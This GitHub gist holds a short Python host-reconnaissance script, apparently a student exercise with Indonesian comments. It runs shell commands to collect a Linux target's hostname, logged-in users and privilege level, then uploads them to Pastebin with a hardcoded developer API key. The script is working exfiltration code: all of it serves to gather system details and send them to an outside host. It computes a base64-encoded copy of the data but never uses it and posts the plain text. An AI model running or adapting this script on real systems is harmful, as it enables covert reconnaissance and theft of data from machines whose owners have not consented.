#date: 2021-12-16T17:08:29Z
#url: https://api.github.com/gists/cf00c7e66aeb4c7943f163599df4f734
#owner: https://api.github.com/users/noellienardi

# Host Reconnaissance. 
# Gather Hostname, Logged-in User, Current privileges
# Emanuel Lienardi 2301865716

import subprocess, base64, requests

API = "NLYA7y4CbBjSjUVyK6Er3PgF4RwnMJBr"
# Unique developer API key dari website pastebin

hostname = subprocess.Popen("cat /proc/sys/kernel/hostname", stdout=subprocess.PIPE, shell=True).stdout.read().decode()
# saya berasumsi sistem target menggunakan linux. command "subprocess popen"  berguna untuk membuat proses baru sehingga parent dan anak baru tadi bisa berkomunikasi. 
# command cat diatas untuk membaca nama host
user = subprocess.Popen("w", stdout=subprocess.PIPE, shell=True).stdout.read().decode()
privileges = subprocess.Popen("id", stdout=subprocess.PIPE, shell=True).stdout.read().decode()
# untuk melihat username yang sudah visit ke website itu, dan tingkat privilege mereka 

print('Hostname = ' + hostname)
print('Username = ' + user)

data = "Hostname: " + hostname
data += "\nLogged in user: " + user
data += "\nCurrent privilege: " + privileges

dataencoded = base64.b64encode(data.encode())
# encode informasi tadi dengan base64
response = requests.post('https://pastebin.com/api/api_post.php', data={'api_dev_key': API, 'api_paste_code': data, 'api_option': 'paste'})
# upload ke pastebin milik kita

print(response.text)